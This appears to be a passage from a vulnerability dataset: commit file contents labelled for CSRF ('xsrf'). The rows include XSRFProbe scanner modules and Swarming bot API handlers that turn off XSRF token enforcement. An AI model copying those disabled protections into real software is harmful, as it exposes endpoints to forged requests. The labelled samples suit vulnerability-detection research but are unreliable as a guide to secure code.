    for x in iterable:
        if x in seen:
            return True
        seen.add(x)
    return False

def byteString(s, encoding='utf8'):
    """"""
    Return a byte-string version of 's',
            Encoded as utf-8.
    """"""
    try:
        s = s.encode(encoding)
    except (UnicodeEncodeError, UnicodeDecodeError):
        s = str(s)
    return s

def subSequence(str1,str2):
    '''
    Returns whether 'str1' and 'str2' are subsequence
                    of one another.
    '''
    j = 0    # Index of str1
    i = 0    # Index of str2

    # Traverse both str1 and str2
    # Compare current character of str2 with
    # First unmatched character of str1
    # If matched, then move ahead in str1
    m = len(str1)
    n = len(str2)
    while j<m and i<n:
        if str1[j] == str2[i]:
            j = j+1
        i = i + 1

    # If all characters of str1 matched, then j is equal to m
    return j==m
/n/n/n",0,xsrf
7,3,398ed11584313a371763240392c4dda1cf986deb,"/core/logger.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-::-:-:#
#    XSRF Probe     #
#-:-:-:-:-:-:-::-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

import os
from core.colors import *
from files.config import *
from core.verbout import verbout
from files.discovered import INTERNAL_URLS, FILES_EXEC, SCAN_ERRORS
from files.discovered import VULN_LIST, FORMS_TESTED, REQUEST_TOKENS

def logger(filename, content):
    '''
    This module is for logging all the stuff we found
            while crawling and scanning.
    '''
    output_file = OUTPUT_DIR + filename + '.log'
    with open(output_file, 'w+', encoding='utf8') as f:
        if type(content) is tuple or type(content) is list:
            for m in content:  # if it is list or tuple, it is iterable
                f.write(m+'\n')
        else:
            f.write(content)  # else we write out as it is... ;)
        f.write('\n')

def pheaders(tup):
    '''
    This module prints out the headers as received in the
                    requests normally.
    '''
    verbout(GR, 'Receiving headers...\n')
    verbout(color.GREY,'  '+color.UNDERLINE+'HEADERS'+color.END+color.GREY+':'+'\n')
    for key, val in tup.items():
        verbout('  ',color.CYAN+key+': '+color.ORANGE+val)
    verbout('','')

def GetLogger():
    if INTERNAL_URLS:
        logger('internal-links', INTERNAL_URLS)
    if SCAN_ERRORS:
        logger('errored', SCAN_ERRORS)
    if FILES_EXEC:
        logger('files-found', FILES_EXEC)
    if REQUEST_TOKENS:
        logger('anti-csrf-tokens', REQUEST_TOKENS)
    if FORMS_TESTED:
        logger('forms-tested', FORMS_TESTED)
    if VULN_LIST:
        logger('vulnerabilities', VULN_LIST)

def ErrorLogger(url, error):
    con = '(i) '+url+' -> '+error.__str__()
    SCAN_ERRORS.append(con)

def VulnLogger(url, vuln):
    tent = '[!] '+url+' -> '+vuln
    VULN_LIST.append(tent)
/n/n/n/core/options.py/n/n#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-::-:-:#
#    XSRF Probe     #
#-:-:-:-:-:-:-::-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

# Importing stuff
import argparse, sys, tld
import urllib.parse, os
from files import config
from core.colors import R, G
from core.updater import updater

# Processing command line arguments
parser = argparse.ArgumentParser('python3 xsrfprobe.py')
parser._action_groups.pop()

# A simple hack to have required argumentsa and optional arguments separately
required = parser.add_argument_group('Required Arguments')
optional = parser.add_argument_group('Optional Arguments')

# Required Options
required.add_argument('-u', '--url', help='Main URL to test', dest='url')

# Optional Arguments (main stuff and necessary)
optional.add_argument('-c', '--cookie', help='Cookie value to be requested with each successive request. If there are multiple cookies, separate them with commas. For example: `-c PHPSESSID=i837c5n83u4, _gid=jdhfbuysf`.', dest='cookie')
optional.add_argument('-o', '--output', help='Output directory where files to be stored. Default is the`files` folder where all files generated will be stored.', dest='output')
optional.add_argument('-d', '--delay', help='Time delay between requests in seconds. Default is zero.', dest='delay', type=float)
optional.add_argument('-q', '--quiet', help='Set the DEBUG mode to quiet. Report only when vulnerabilities are found. Minimal output will be printed on screen. ', dest='quiet', action='store_true')
optional.add_argument('-v', '--verbose', help='Increase the verbosity of the output (e.g., -vv is more than -v). ', dest='verbose', action='store_true')

# Other Options
# optional.add_argument('-h', '--help', help='Show this help message and exit', dest='disp', default=argparse.SUPPRESS, action='store_true')
optional.add_argument('--user-agent', help='Custom user-agent to be used. Only one user-agent can be specified.', dest='user_agent', type=str)
optional.add_argument('--headers', help='Comma separated list of custom headers you\'d want to use. For example: ``--headers ""Accept=text/php, X-Requested-With=Dumb""``.', dest='headers', type=str)
optional.add_argument('--exclude', help='Comma separated list of paths or directories to be excluded which are not in scope. These paths/dirs won\'t be scanned. For example: `--exclude somepage/, sensitive-dir/, pleasedontscan/`', dest='exclude', type=str)
optional.add_argument('--timeout', help='HTTP request timeout value in seconds. The entered value must be in floating point decimal. Example: ``--timeout 10.0``', dest='timeout', type=float)
optional.add_argument('--max-chars', help='Maximum allowed character length for the custom token value to be generated. For example: `--max-chars 5`. Default value is 6.', dest='maxchars', type=int)
optional.add_argument('--crawl', help=""Crawl the whole site and simultaneously test all discovered endpoints for CSRF."", dest='crawl', action='store_true')
optional.add_argument('--skip-analysis', help='Skip the Post-Scan Analysis of Tokens which were gathered during requests', dest='skipal', action='store_true')
optional.add_argument('--skip-poc', help='Skip the PoC Form Generation of POST-Based Cross Site Request Forgeries.', dest='skippoc', action='store_true')
optional.add_argument('--update', help='Update XSRFProbe to latest version on GitHub via git.', dest='update', action='store_true')
optional.add_argument('--random-agent', help='Use random user-agents for making requests.', dest='randagent', action='store_true')
optional.add_argument('--version', help='Display the version of XSRFProbe and exit.', dest='version', action='store_true')
args = parser.parse_args()

if not len(sys.argv) > 1:
    print('''
    \033[1;91mXSRFProbe\033[0m, \033[1;97mA \033[1;93mCross Site Request Forgery \033[1;97mAudit Toolkit\033[0m
''')
    parser.print_help()
    quit('')

# Update XSRFProbe to latest version
if args.update:
    updater()
    quit('')

# Print out XSRFProbe version
if args.version:
    print('\n\033[1;97m [+] \033[1;91mXSRFProbe Version\033[0m : \033[1;97m'+open('files/VersionNum').read())
    quit()

# Now lets update some global config variables
if args.maxchars:
    config.TOKEN_GENERATION_LENGTH = args.maxchars

# Setting custom user-agent
if args.user_agent:
    config.USER_AGENT = args.user_agent

# Option to skip analysis
if args.skipal:
    config.SCAN_ANALYSIS = False

# Option to skip poc generation
if args.skippoc:
    config.POC_GENERATION = False

# Updating main root url
if not args.version and not args.update:
    if args.url: # and not args.help:
        if 'http' in args.url:
            config.SITE_URL = args.url
        else:
            config.SITE_URL = 'http://'+args.url
    else:
        print(R+'You must supply a url/endpoint.')

# Crawl the site if --crawl supplied.
if args.crawl:
    config.CRAWL_SITE = True

if args.cookie:
    # Assigning Cookie
    if ',' in args.cookie:
        for cook in args.cookie.split(','):
            config.COOKIE_VALUE.append(cook.strip())
            # This is necessary when a cookie value is supplied
            # Since if the user-agent used to make the request changes
            # from time to time, the remote site might trigger up
            # security mechanisms (or worse, perhaps block your ip?)
            config.USER_AGENT_RANDOM = False

# Timeout value
if args.timeout:
    config.TIMEOUT_VALUE = args.timeout

# Custom header values if specified
if args.headers:
    # NOTE: As a default idea, when the user supplies custom headers, we
    # simply add the custom headers to a list of existing headers in
    # files/config.py.
    # Uncomment the following lines to just reinitialise the headers everytime
    # they make a request.
    #
    #config.HEADER_VALUES = {}
    for m in args.headers.split(','):
        config.HEADER_VALUES[m.split('=')[0]] = m.split('=')[1]

if args.exclude:
    exc = args.exclude
    #config.EXCLUDE_URLS = [s for s in exc.split(',').strip()]
    m = exc.split(',').strip()
    for s in m:
        config.EXCLUDE_DIRS.append(urllib.parse.urljoin(config.SITE_URL, s))

if args.randagent:
    # If random-agent argument supplied...
    config.USER_AGENT_RANDOM = True
    # Turn off a single User-Agent mechanism...
    config.USER_AGENT = ''

if config.SITE_URL:
    if args.output:
        # If output directory is mentioned...
        try:
            if not os.path.exists(args.output+tld.get_fld(config.SITE_URL)):
                os.makedirs(args.output+tld.get_fld(config.SITE_URL))
        except FileExistsError:
            pass
        config.OUTPUT_DIR = args.output+tld.get_fld(config.SITE_URL) + '/'
    else:
        try:
            os.makedirs(tld.get_fld(config.SITE_URL))
        except FileExistsError:
            pass
        config.OUTPUT_DIR = tld.get_fld(config.SITE_URL) + '/'

if args.quiet:
    config.DEBUG = False
/n/n/n",1,xsrf
8,82,c23a5bf6278f55b3f8135e0edab9927599a09236,"appengine/swarming/handlers_bot.py/n/n# Copyright 2015 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Internal bot API handlers.""""""

import base64
import json
import logging
import textwrap

import webob
import webapp2

from google.appengine.api import app_identity
from google.appengine.api import datastore_errors
from google.appengine.datastore import datastore_query
from google.appengine import runtime
from google.appengine.ext import ndb

from components import auth
from components import ereporter2
from components import utils
from server import acl
from server import bot_code
from server import bot_management
from server import stats
from server import task_pack
from server import task_request
from server import task_result
from server import task_scheduler
from server import task_to_run


def has_unexpected_subset_keys(expected_keys, minimum_keys, actual_keys, name):
  """"""Returns an error if unexpected keys are present or expected keys are
  missing.

  Accepts optional keys.

  This is important to catch typos.
  """"""
  actual_keys = frozenset(actual_keys)
  superfluous = actual_keys - expected_keys
  missing = minimum_keys - actual_keys
  if superfluous or missing:
    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''
    msg_superfluous = (
        (' superfluous: %s' % sorted(superfluous)) if superfluous else '')
    return 'Unexpected %s%s%s; did you make a typo?' % (
        name, msg_missing, msg_superfluous)


def has_unexpected_keys(expected_keys, actual_keys, name):
  """"""Return an error if unexpected keys are present or expected keys are
  missing.
  """"""
  return has_unexpected_subset_keys(
      expected_keys, expected_keys, actual_keys, name)


def log_unexpected_subset_keys(
    expected_keys, minimum_keys, actual_keys, request, source, name):
  """"""Logs an error if unexpected keys are present or expected keys are missing.

  Accepts optional keys.

  This is important to catch typos.
  """"""
  message = has_unexpected_subset_keys(
    expected_keys, minimum_keys, actual_keys, name)
  if message:
    ereporter2.log_request(request, source=source, message=message)
  return message


def log_unexpected_keys(expected_keys, actual_keys, request, source, name):
  """"""Logs an error if unexpected keys are present or expected keys are missing.
  """"""
  return log_unexpected_subset_keys(
      expected_keys, expected_keys, actual_keys, request, source, name)


def has_missing_keys(minimum_keys, actual_keys, name):
  """"""Returns an error if expected keys are not present.

  Do not warn about unexpected keys.
  """"""
  actual_keys = frozenset(actual_keys)
  missing = minimum_keys - actual_keys
  if missing:
    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''
    return 'Unexpected %s%s; did you make a typo?' % (name, msg_missing)


class BootstrapHandler(auth.AuthenticatingHandler):
  """"""Returns python code to run to bootstrap a swarming bot.""""""

  @auth.require(acl.is_bot)
  def get(self):
    self.response.headers['Content-Type'] = 'text/x-python'
    self.response.headers['Content-Disposition'] = (
        'attachment; filename=""swarming_bot_bootstrap.py""')
    self.response.out.write(
        bot_code.get_bootstrap(self.request.host_url).content)


class BotCodeHandler(auth.AuthenticatingHandler):
  """"""Returns a zip file with all the files required by a bot.

  Optionally specify the hash version to download. If so, the returned data is
  cacheable.
  """"""

  @auth.require(acl.is_bot)
  def get(self, version=None):
    if version:
      expected = bot_code.get_bot_version(self.request.host_url)
      if version != expected:
        # This can happen when the server is rapidly updated.
        logging.error('Requested Swarming bot %s, have %s', version, expected)
        self.abort(404)
      self.response.headers['Cache-Control'] = 'public, max-age=3600'
    else:
      self.response.headers['Cache-Control'] = 'no-cache, no-store'
    self.response.headers['Content-Type'] = 'application/octet-stream'
    self.response.headers['Content-Disposition'] = (
        'attachment; filename=""swarming_bot.zip""')
    self.response.out.write(
        bot_code.get_swarming_bot_zip(self.request.host_url))


class _BotBaseHandler(auth.ApiHandler):
  """"""
  Request body is a JSON dict:
    {
      ""dimensions"": <dict of properties>,
      ""state"": <dict of properties>,
      ""version"": <sha-1 of swarming_bot.zip uncompressed content>,
    }
  """"""

  EXPECTED_KEYS = {u'dimensions', u'state', u'version'}
  REQUIRED_STATE_KEYS = {u'running_time', u'sleep_streak'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  def _process(self):
    """"""Returns True if the bot has invalid parameter and should be automatically
    quarantined.

    Does one DB synchronous GET.

    Returns:
      tuple(request, bot_id, version, state, dimensions, quarantined_msg)
    """"""
    request = self.parse_body()
    version = request.get('version', None)

    dimensions = request.get('dimensions', {})
    state = request.get('state', {})
    bot_id = None
    if dimensions.get('id'):
      dimension_id = dimensions['id']
      if (isinstance(dimension_id, list) and len(dimension_id) == 1
          and isinstance(dimension_id[0], unicode)):
        bot_id = dimensions['id'][0]

    # The bot may decide to ""self-quarantine"" itself. Accept both via
    # dimensions or via state. See bot_management._BotCommon.quarantined for
    # more details.
    if (bool(dimensions.get('quarantined')) or
        bool(state.get('quarantined'))):
      return request, bot_id, version, state, dimensions, 'Bot self-quarantined'

    quarantined_msg = None
    # Use a dummy 'for' to be able to break early from the block.
    for _ in [0]:

      quarantined_msg = has_unexpected_keys(
          self.EXPECTED_KEYS, request, 'keys')
      if quarantined_msg:
        break

      quarantined_msg = has_missing_keys(
          self.REQUIRED_STATE_KEYS, state, 'state')
      if quarantined_msg:
        break

      if not bot_id:
        quarantined_msg = 'Missing bot id'
        break

      if not all(
          isinstance(key, unicode) and
          isinstance(values, list) and
          all(isinstance(value, unicode) for value in values)
          for key, values in dimensions.iteritems()):
        quarantined_msg = (
            'Invalid dimensions type:\n%s' % json.dumps(dimensions,
              sort_keys=True, indent=2, separators=(',', ': ')))
        break

      dimensions_count = task_to_run.dimensions_powerset_count(dimensions)
      if dimensions_count > task_to_run.MAX_DIMENSIONS:
        quarantined_msg = 'Dimensions product %d is too high' % dimensions_count
        break

      if not isinstance(
          state.get('lease_expiration_ts'), (None.__class__, int)):
        quarantined_msg = (
            'lease_expiration_ts (%r) must be int or None' % (
                state['lease_expiration_ts']))
        break

    if quarantined_msg:
      line = 'Quarantined Bot\nhttps://%s/restricted/bot/%s\n%s' % (
          app_identity.get_default_version_hostname(), bot_id,
          quarantined_msg)
      ereporter2.log_request(self.request, source='bot', message=line)
      return request, bot_id, version, state, dimensions, quarantined_msg

    # Look for admin enforced quarantine.
    bot_settings = bot_management.get_settings_key(bot_id).get()
    if bool(bot_settings and bot_settings.quarantined):
      return request, bot_id, version, state, dimensions, 'Quarantined by admin'

    return request, bot_id, version, state, dimensions, None


class BotHandshakeHandler(_BotBaseHandler):
  """"""First request to be called to get initial data like XSRF token.

  The bot is server-controled so the server doesn't have to support multiple API
  version. When running a task, the bot sync the the version specific URL. Once
  abot finished its currently running task, it'll be immediately be upgraded
  after on its next poll.

  This endpoint does not return commands to the bot, for example to upgrade
  itself. It'll be told so when it does its first poll.

  Response body is a JSON dict:
    {
      ""bot_version"": <sha-1 of swarming_bot.zip uncompressed content>,
      ""server_version"": ""138-193f1f3"",
    }
  """"""

  @auth.require(acl.is_bot)
  def post(self):
    (_request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    bot_management.bot_event(
        event_type='bot_connected', bot_id=bot_id,
        external_ip=self.request.remote_addr, dimensions=dimensions,
        state=state, version=version, quarantined=bool(quarantined_msg),
        task_id='', task_name=None, message=quarantined_msg)

    data = {
      # This access token will be used to validate each subsequent request.
      'bot_version': bot_code.get_bot_version(self.request.host_url),
      # TODO(maruel): Remove this once all the bots have been updated.
      'expiration_sec': auth.handler.XSRFToken.expiration_sec,
      'server_version': utils.get_app_version(),
      # TODO(maruel): Remove this once all the bots have been updated.
      'xsrf_token': self.generate_xsrf_token(),
    }
    self.send_response(data)


class BotPollHandler(_BotBaseHandler):
  """"""The bot polls for a task; returns either a task, update command or sleep.

  In case of exception on the bot, this is enough to get it just far enough to
  eventually self-update to a working version. This is to ensure that coding
  errors in bot code doesn't kill all the fleet at once, they should still be up
  just enough to be able to self-update again even if they don't get task
  assigned anymore.
  """"""

  @auth.require(acl.is_bot)
  def post(self):
    """"""Handles a polling request.

    Be very permissive on missing values. This can happen because of errors
    on the bot, *we don't want to deny them the capacity to update*, so that the
    bot code is eventually fixed and the bot self-update to this working code.

    It makes recovery of the fleet in case of catastrophic failure much easier.
    """"""
    (_request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    sleep_streak = state.get('sleep_streak', 0)
    quarantined = bool(quarantined_msg)

    # Note bot existence at two places, one for stats at 1 minute resolution,
    # the other for the list of known bots.
    action = 'bot_inactive' if quarantined else 'bot_active'
    stats.add_entry(action=action, bot_id=bot_id, dimensions=dimensions)

    def bot_event(event_type, task_id=None, task_name=None):
      bot_management.bot_event(
          event_type=event_type, bot_id=bot_id,
          external_ip=self.request.remote_addr, dimensions=dimensions,
          state=state, version=version, quarantined=quarantined,
          task_id=task_id, task_name=task_name, message=quarantined_msg)

    # Bot version is host-specific because the host URL is embedded in
    # swarming_bot.zip
    expected_version = bot_code.get_bot_version(self.request.host_url)
    if version != expected_version:
      bot_event('request_update')
      self._cmd_update(expected_version)
      return
    if quarantined:
      bot_event('request_sleep')
      self._cmd_sleep(sleep_streak, quarantined)
      return

    #
    # At that point, the bot should be in relatively good shape since it's
    # running the right version. It is still possible that invalid code was
    # pushed to the server, so be diligent about it.
    #

    # Bot may need a reboot if it is running for too long. We do not reboot
    # quarantined bots.
    needs_restart, restart_message = bot_management.should_restart_bot(
        bot_id, state)
    if needs_restart:
      bot_event('request_restart')
      self._cmd_restart(restart_message)
      return

    # The bot is in good shape. Try to grab a task.
    try:
      # This is a fairly complex function call, exceptions are expected.
      request, run_result = task_scheduler.bot_reap_task(
          dimensions, bot_id, version, state.get('lease_expiration_ts'))
      if not request:
        # No task found, tell it to sleep a bit.
        bot_event('request_sleep')
        self._cmd_sleep(sleep_streak, quarantined)
        return

      try:
        # This part is tricky since it intentionally runs a transaction after
        # another one.
        if request.properties.is_terminate:
          bot_event('bot_terminate', task_id=run_result.task_id)
          self._cmd_terminate(run_result.task_id)
        else:
          bot_event(
              'request_task', task_id=run_result.task_id,
              task_name=request.name)
          self._cmd_run(request, run_result.key, bot_id)
      except:
        logging.exception('Dang, exception after reaping')
        raise
    except runtime.DeadlineExceededError:
      # If the timeout happened before a task was assigned there is no problems.
      # If the timeout occurred after a task was assigned, that task will
      # timeout (BOT_DIED) since the bot didn't get the details required to
      # run it) and it will automatically get retried (TODO) when the task times
      # out.
      # TODO(maruel): Note the task if possible and hand it out on next poll.
      # https://code.google.com/p/swarming/issues/detail?id=130
      self.abort(500, 'Deadline')

  def _cmd_run(self, request, run_result_key, bot_id):
    cmd = None
    if request.properties.commands:
      cmd = request.properties.commands[0]
    elif request.properties.command:
      cmd = request.properties.command
    out = {
      'cmd': 'run',
      'manifest': {
        'bot_id': bot_id,
        'command': cmd,
        'dimensions': request.properties.dimensions,
        'env': request.properties.env,
        'extra_args': request.properties.extra_args,
        'grace_period': request.properties.grace_period_secs,
        'hard_timeout': request.properties.execution_timeout_secs,
        'host': utils.get_versioned_hosturl(),
        'io_timeout': request.properties.io_timeout_secs,
        'inputs_ref': request.properties.inputs_ref,
        'task_id': task_pack.pack_run_result_key(run_result_key),
      },
    }
    self.send_response(utils.to_json_encodable(out))

  def _cmd_sleep(self, sleep_streak, quarantined):
    out = {
      'cmd': 'sleep',
      'duration': task_scheduler.exponential_backoff(sleep_streak),
      'quarantined': quarantined,
    }
    self.send_response(out)

  def _cmd_terminate(self, task_id):
    out = {
      'cmd': 'terminate',
      'task_id': task_id,
    }
    self.send_response(out)

  def _cmd_update(self, expected_version):
    out = {
      'cmd': 'update',
      'version': expected_version,
    }
    self.send_response(out)

  def _cmd_restart(self, message):
    logging.info('Rebooting bot: %s', message)
    out = {
      'cmd': 'restart',
      'message': message,
    }
    self.send_response(out)


class BotEventHandler(_BotBaseHandler):
  """"""On signal that a bot had an event worth logging.""""""

  EXPECTED_KEYS = _BotBaseHandler.EXPECTED_KEYS | {u'event', u'message'}

  @auth.require(acl.is_bot)
  def post(self):
    (request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    event = request.get('event')
    if event not in ('bot_error', 'bot_rebooting', 'bot_shutdown'):
      self.abort_with_error(400, error='Unsupported event type')
    message = request.get('message')
    bot_management.bot_event(
        event_type=event, bot_id=bot_id, external_ip=self.request.remote_addr,
        dimensions=dimensions, state=state, version=version,
        quarantined=bool(quarantined_msg), task_id=None, task_name=None,
        message=message)

    if event == 'bot_error':
      line = (
          'Bot: https://%s/restricted/bot/%s\n'
          'Bot error:\n'
          '%s') % (
          app_identity.get_default_version_hostname(), bot_id, message)
      ereporter2.log_request(self.request, source='bot', message=line)
    self.send_response({})


class BotTaskUpdateHandler(auth.ApiHandler):
  """"""Receives updates from a Bot for a task.

  The handler verifies packets are processed in order and will refuse
  out-of-order packets.
  """"""
  ACCEPTED_KEYS = {
    u'bot_overhead', u'cost_usd', u'duration', u'exit_code',
    u'hard_timeout', u'id', u'io_timeout', u'isolated_stats', u'output',
    u'output_chunk_start', u'outputs_ref', u'task_id',
  }
  REQUIRED_KEYS = {u'id', u'task_id'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  @auth.require(acl.is_bot)
  def post(self, task_id=None):
    # Unlike handshake and poll, we do not accept invalid keys here. This code
    # path is much more strict.
    request = self.parse_body()
    msg = log_unexpected_subset_keys(
        self.ACCEPTED_KEYS, self.REQUIRED_KEYS, request, self.request, 'bot',
        'keys')
    if msg:
      self.abort_with_error(400, error=msg)

    bot_id = request['id']
    cost_usd = request['cost_usd']
    task_id = request['task_id']

    bot_overhead = request.get('bot_overhead')
    duration = request.get('duration')
    exit_code = request.get('exit_code')
    hard_timeout = request.get('hard_timeout')
    io_timeout = request.get('io_timeout')
    isolated_stats = request.get('isolated_stats')
    output = request.get('output')
    output_chunk_start = request.get('output_chunk_start')
    outputs_ref = request.get('outputs_ref')

    if bool(isolated_stats) != (bot_overhead is not None):
      ereporter2.log_request(
          request=self.request,
          source='server',
          category='task_failure',
          message='Failed to update task: %s' % task_id)
      self.abort_with_error(
          400,
          error='Both bot_overhead and isolated_stats must be set '
                'simultaneously\nbot_overhead: %s\nisolated_stats: %s' %
                (bot_overhead, isolated_stats))

    run_result_key = task_pack.unpack_run_result_key(task_id)
    performance_stats = None
    if isolated_stats:
      download = isolated_stats['download']
      upload = isolated_stats['upload']
      performance_stats = task_result.PerformanceStats(
          bot_overhead=bot_overhead,
          isolated_download=task_result.IsolatedOperation(
              duration=download['duration'],
              initial_number_items=download['initial_number_items'],
              initial_size=download['initial_size'],
              items_cold=base64.b64decode(download['items_cold']),
              items_hot=base64.b64decode(download['items_hot'])),
          isolated_upload=task_result.IsolatedOperation(
              duration=upload['duration'],
              items_cold=base64.b64decode(upload['items_cold']),
              items_hot=base64.b64decode(upload['items_hot'])))

    if output is not None:
      try:
        output = base64.b64decode(output)
      except UnicodeEncodeError as e:
        logging.error('Failed to decode output\n%s\n%r', e, output)
        output = output.encode('ascii', 'replace')
      except TypeError as e:
        # Save the output as-is instead. The error will be logged in ereporter2
        # and returning a HTTP 500 would only force the bot to stay in a retry
        # loop.
        logging.error('Failed to decode output\n%s\n%r', e, output)
    if outputs_ref:
      outputs_ref = task_request.FilesRef(**outputs_ref)

    try:
      state = task_scheduler.bot_update_task(
          run_result_key=run_result_key,
          bot_id=bot_id,
          output=output,
          output_chunk_start=output_chunk_start,
          exit_code=exit_code,
          duration=duration,
          hard_timeout=hard_timeout,
          io_timeout=io_timeout,
          cost_usd=cost_usd,
          outputs_ref=outputs_ref,
          performance_stats=performance_stats)
      if not state:
        logging.info('Failed to update, please retry')
        self.abort_with_error(500, error='Failed to update, please retry')

      if state in (task_result.State.COMPLETED, task_result.State.TIMED_OUT):
        action = 'task_completed'
      else:
        assert state == task_result.State.RUNNING, state
        action = 'task_update'
      bot_management.bot_event(
          event_type=action, bot_id=bot_id,
          external_ip=self.request.remote_addr, dimensions=None, state=None,
          version=None, quarantined=None, task_id=task_id, task_name=None)
    except ValueError as e:
      ereporter2.log_request(
          request=self.request,
          source='server',
          category='task_failure',
          message='Failed to update task: %s' % e)
      self.abort_with_error(400, error=str(e))
    except webob.exc.HTTPException:
      raise
    except Exception as e:
      logging.exception('Internal error: %s', e)
      self.abort_with_error(500, error=str(e))

    # TODO(maruel): When a task is canceled, reply with 'DIE' so that the bot
    # reboots itself to abort the task abruptly. It is useful when a task hangs
    # and the timeout was set too long or the task was superseded by a newer
    # task with more recent executable (e.g. a new Try Server job on a newer
    # patchset on Rietveld).
    self.send_response({'ok': True})


class BotTaskErrorHandler(auth.ApiHandler):
  """"""It is a specialized version of ereporter2's /ereporter2/api/v1/on_error
  that also attaches a task id to it.

  This formally kills the task, marking it as an internal failure. This can be
  used by bot_main.py to kill the task when task_runner misbehaved.
  """"""

  EXPECTED_KEYS = {u'id', u'message', u'task_id'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  @auth.require(acl.is_bot)
  def post(self, task_id=None):
    request = self.parse_body()
    bot_id = request.get('id')
    task_id = request.get('task_id', '')
    message = request.get('message', 'unknown')

    bot_management.bot_event(
        event_type='task_error', bot_id=bot_id,
        external_ip=self.request.remote_addr, dimensions=None, state=None,
        version=None, quarantined=None, task_id=task_id, task_name=None,
        message=message)
    line = (
        'Bot: https://%s/restricted/bot/%s\n'
        'Task failed: https://%s/user/task/%s\n'
        '%s') % (
        app_identity.get_default_version_hostname(), bot_id,
        app_identity.get_default_version_hostname(), task_id,
        message)
    ereporter2.log_request(self.request, source='bot', message=line)

    msg = log_unexpected_keys(
        self.EXPECTED_KEYS, request, self.request, 'bot', 'keys')
    if msg:
      self.abort_with_error(400, error=msg)

    msg = task_scheduler.bot_kill_task(
        task_pack.unpack_run_result_key(task_id), bot_id)
    if msg:
      logging.error(msg)
      self.abort_with_error(400, error=msg)
    self.send_response({})


class ServerPingHandler(webapp2.RequestHandler):
  """"""Handler to ping when checking if the server is up.

  This handler should be extremely lightweight. It shouldn't do any
  computations, it should just state that the server is up. It's open to
  everyone for simplicity and performance.
  """"""

  def get(self):
    self.response.headers['Content-Type'] = 'text/plain; charset=utf-8'
    self.response.out.write('Server up')


def get_routes():
  routes = [
      ('/bootstrap', BootstrapHandler),
      ('/bot_code', BotCodeHandler),
      ('/swarming/api/v1/bot/bot_code/<version:[0-9a-f]{40}>', BotCodeHandler),
      ('/swarming/api/v1/bot/event', BotEventHandler),
      ('/swarming/api/v1/bot/handshake', BotHandshakeHandler),
      ('/swarming/api/v1/bot/poll', BotPollHandler),
      ('/swarming/api/v1/bot/server_ping', ServerPingHandler),
      ('/swarming/api/v1/bot/task_update', BotTaskUpdateHandler),
      ('/swarming/api/v1/bot/task_update/<task_id:[a-f0-9]+>',
          BotTaskUpdateHandler),
      ('/swarming/api/v1/bot/task_error', BotTaskErrorHandler),
      ('/swarming/api/v1/bot/task_error/<task_id:[a-f0-9]+>',
          BotTaskErrorHandler),
  ]
  return [webapp2.Route(*i) for i in routes]
/n/n/nappengine/swarming/server/bot_archive.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Generates the swarming_bot.zip archive for the bot.

Unlike the other source files, this file can be run from ../tools/bot_archive.py
stand-alone to generate a swarming_bot.zip for local testing so it doesn't
import anything from the AppEngine SDK.

The hash of the content of the files in the archive is used to define the
current version of the swarming bot code.
""""""

import hashlib
import json
import logging
import os
import StringIO
import zipfile


# List of files needed by the swarming bot.
# TODO(maruel): Make the list automatically generated?
FILES = (
    '__main__.py',
    'api/__init__.py',
    'api/bot.py',
    'api/parallel.py',
    'api/os_utilities.py',
    'api/platforms/__init__.py',
    'api/platforms/android.py',
    'api/platforms/common.py',
    'api/platforms/gce.py',
    'api/platforms/linux.py',
    'api/platforms/osx.py',
    'api/platforms/posix.py',
    'api/platforms/win.py',
    'bot_code/__init__.py',
    'bot_code/bot_main.py',
    'bot_code/common.py',
    'bot_code/singleton.py',
    'bot_code/task_runner.py',
    'client/auth.py',
    'client/isolated_format.py',
    'client/isolateserver.py',
    'client/run_isolated.py',
    'config/__init__.py',
    'third_party/__init__.py',
    'third_party/colorama/__init__.py',
    'third_party/colorama/ansi.py',
    'third_party/colorama/ansitowin32.py',
    'third_party/colorama/initialise.py',
    'third_party/colorama/win32.py',
    'third_party/colorama/winterm.py',
    'third_party/depot_tools/__init__.py',
    'third_party/depot_tools/fix_encoding.py',
    'third_party/depot_tools/subcommand.py',
    'third_party/httplib2/__init__.py',
    'third_party/httplib2/cacerts.txt',
    'third_party/httplib2/iri2uri.py',
    'third_party/httplib2/socks.py',
    'third_party/oauth2client/__init__.py',
    'third_party/oauth2client/_helpers.py',
    'third_party/oauth2client/_openssl_crypt.py',
    'third_party/oauth2client/_pycrypto_crypt.py',
    'third_party/oauth2client/client.py',
    'third_party/oauth2client/clientsecrets.py',
    'third_party/oauth2client/crypt.py',
    'third_party/oauth2client/file.py',
    'third_party/oauth2client/gce.py',
    'third_party/oauth2client/keyring_storage.py',
    'third_party/oauth2client/locked_file.py',
    'third_party/oauth2client/multistore_file.py',
    'third_party/oauth2client/service_account.py',
    'third_party/oauth2client/tools.py',
    'third_party/oauth2client/util.py',
    'third_party/oauth2client/xsrfutil.py',
    'third_party/pyasn1/pyasn1/__init__.py',
    'third_party/pyasn1/pyasn1/codec/__init__.py',
    'third_party/pyasn1/pyasn1/codec/ber/__init__.py',
    'third_party/pyasn1/pyasn1/codec/ber/decoder.py',
    'third_party/pyasn1/pyasn1/codec/ber/encoder.py',
    'third_party/pyasn1/pyasn1/codec/ber/eoo.py',
    'third_party/pyasn1/pyasn1/codec/cer/__init__.py',
    'third_party/pyasn1/pyasn1/codec/cer/decoder.py',
    'third_party/pyasn1/pyasn1/codec/cer/encoder.py',
